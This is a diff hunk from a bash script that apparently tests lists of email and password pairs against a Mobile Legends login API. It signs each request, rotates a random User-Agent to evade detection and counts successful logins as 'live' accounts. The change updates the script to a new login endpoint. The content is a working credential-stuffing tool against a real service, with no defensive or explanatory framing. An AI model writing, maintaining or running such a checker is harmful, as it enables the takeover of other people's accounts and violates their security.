@@ -50,7 +50,7 @@ for email in $(cat $l); do
     randAgent="Mozilla/${RANDOM:0:1}.${RANDOM:0:1} (Ubuntu ${RANDOM:0:1}.${RANDOM:0:1};en-US;)"
     bruh=$(echo -n "account=${user}&md5pwd=${md5p}&op=login" | md5sum | awk '{print $1}')
     data="{\"op\":\"login\",\"sign\":\"${bruh}\",\"params\":{\"account\":\"${user}\",\"md5pwd\":\"${md5p}\"},\"lang\":\"en\"}"
-    curl=$(curl -s https://accountmtapi.mobilelegends.com/ --data "${data}" -H "User-Agent: ${randAgent}")
+    curl=$(curl -s https://mtacc.mobilelegends.com/v2.1/inapp/login --data "${data}" -H "User-Agent: ${randAgent}")
     parser=$(echo $curl | jq .message)
     if [[ "$parser" =~ "Error_Success" ]]; then
         live=$[$live+1]
